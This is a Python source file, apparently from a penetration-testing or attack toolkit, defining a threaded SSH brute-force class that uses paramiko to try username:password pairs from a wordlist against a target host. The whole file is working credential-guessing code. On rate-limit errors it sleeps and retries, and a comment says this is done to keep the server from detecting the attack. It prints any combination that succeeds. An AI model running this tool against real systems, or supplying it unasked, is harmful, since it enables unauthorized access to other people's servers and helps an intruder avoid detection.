import threading
import os
import paramiko
import socket
import time
from .misc import *


class SSHBrute(threading.Thread):
    def __init__(self, target):
        """"
        Default constrictor.
        :param target:
        :return:
        """
        threading.Thread.__init__(self)
        self.target = target

    def ssh_brute(self, hostname, username, password):
        """"
        Runs the SSH brute force function on the SSH service.
        :param hostname:
        :param username:
        :param password:
        :return False:
        :return True:
        """
        # Initializing SSH Client.
        client = paramiko.SSHClient()

        # Adding to know hosts.
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            # Do when host is unreachable.
            print(print_red(f"\n[!] [SSH] Host: {hostname} is unreachable, timed out."))
            return False
        except paramiko.AuthenticationException:
            # Do when username and password combination is incorrect.
            return False
        except paramiko.SSHException:
            # Prevent server from detecting the brute force.
            print(print_red(f"\n[!] [SSH] Quota exceeded, retrying with delay..."))

            # Sleep for a minute.
            time.sleep(60)
            return self.ssh_brute(hostname, username, password)
        else:
            # Connection has been established.
            print(print_green(f"[!] \n[SSH] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}"))
            return True

    def run(self):
        """"
        Reads the wordlist and runs the brute force function on the SSH service.
        :param:
        :return:
        """
        # Read the file.
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists", "ssh_wordlist.txt")
        cred_list = open(wordlist_path).read().splitlines()

        # Start the brute force.
        for cred in cred_list:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if self.ssh_brute(self.target, username, password):
                break
